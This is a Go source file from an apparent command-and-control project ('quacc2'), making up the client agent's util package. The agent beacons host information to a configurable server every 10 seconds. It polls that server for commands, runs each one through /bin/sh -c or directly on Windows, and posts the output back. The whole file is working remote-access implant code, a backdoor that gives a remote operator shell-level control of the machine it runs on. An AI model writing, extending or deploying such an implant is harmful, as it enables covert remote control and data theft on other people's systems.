package util

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"net/url"
	"os"
	"os/exec"
	"quacc2/client/models"
	"strings"
	"time"
)

var (
	Agent *models.Agent
)

//auto call when runtime
func init() {
	var serveraddr, port string
	if len(os.Args) == 3{
		serveraddr = os.Args[1]
		port = os.Args[2]
	}else{
		serveraddr = "127.0.0.1"
		port = "8080"
	}
	debug := true
	agent, err := models.NewAgent(debug, "http2", serveraddr, port)
	if err != nil {
		fmt.Println(err)
		os.Exit(0)
	}
	Agent = agent
}

func Ping() {
	agentInfo := Agent.ParseInfo()
	data, _ := json.Marshal(agentInfo)
	url := fmt.Sprintf("%v/ping", Agent.URL)

	beat := time.Tick(10 * time.Second)
	for range beat {
		req, err := http.NewRequest("POST", url, bytes.NewBuffer(data))
		resp, err := Agent.Client.Do(req)
		if err == nil {
			_ = resp.Body.Close()
		}
	}
}

//every 10tick send request to server to get command
//run done -> call submitCmd to send result
func Command() {
	fmt.Println("agent: ", Agent)
	url := fmt.Sprintf("%v/cmd/%v", Agent.URL, Agent.AgentId)

	beat := time.Tick(10 * time.Second)
	for range beat {
		req, err := http.NewRequest("POST", url, nil)
		resp, err := Agent.Client.Do(req)
		if err == nil {
			r, err := ioutil.ReadAll(resp.Body)
			if err == nil {
				cmds := make([]models.Command, 0)
				err = json.Unmarshal(r, &cmds)
				for _, cmd := range cmds {
					ret, err := execCmd(cmd.Content)
					fmt.Println(cmd, ret, err)
					submitCmd(cmd.Id, ret)
				}
				_ = resp.Body.Close()
			}
		}
	}
}

func execCmd(command string) (string, error) {
	os := Agent.Platform
	if os=="windows" {
		Cmd := exec.Command(command)
		retCmd, err := Cmd.CombinedOutput()
		retString := string(retCmd)
		return retString, err
	}else {
		Cmd := exec.Command("/bin/sh", "-c", command)
		retCmd, err := Cmd.CombinedOutput()
		retString := string(retCmd)
		return retString, err
	}
}

//send result to server
func submitCmd(id int64, result string) error {
	urlCmd := fmt.Sprintf("%v/send_result/%v", Agent.URL, id)
	data := url.Values{}
	data.Add("result", result)
	body := strings.NewReader(data.Encode())

	req, err := http.NewRequest("POST", urlCmd, body)
	if err != nil {
		return err
	}
	req.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	resp, err := Agent.Client.Do(req)
	if err != nil {
		return err
	}
	err = resp.Body.Close()
	return err
}
